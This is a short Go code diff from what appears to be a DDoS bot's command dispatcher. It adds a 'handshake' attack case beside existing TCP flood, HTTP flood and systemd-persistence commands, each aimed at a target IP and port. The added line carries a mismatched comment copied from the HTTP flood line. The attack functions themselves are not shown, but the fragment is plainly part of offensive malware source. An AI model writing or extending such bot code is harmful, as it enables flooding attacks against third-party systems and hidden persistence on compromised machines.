@@ -43,6 +43,8 @@ func HandleCommand(command string) error {
 		go attacks.PerformTCPFlood(targetIP, targetPort, duration)
 	case "httpflood":
 		go attacks.PerformHTTPFlood(targetIP, duration, targetPort) // Call the HTTP flood function
+	case "handshake":
+		go attacks.PerformThreeWayHandshake(targetIP, duration, targetPort) // Call the HTTP flood function
 	case "persistence":
 		go SystemdPersistence() // Execute SystemdPersistence function
 	default:
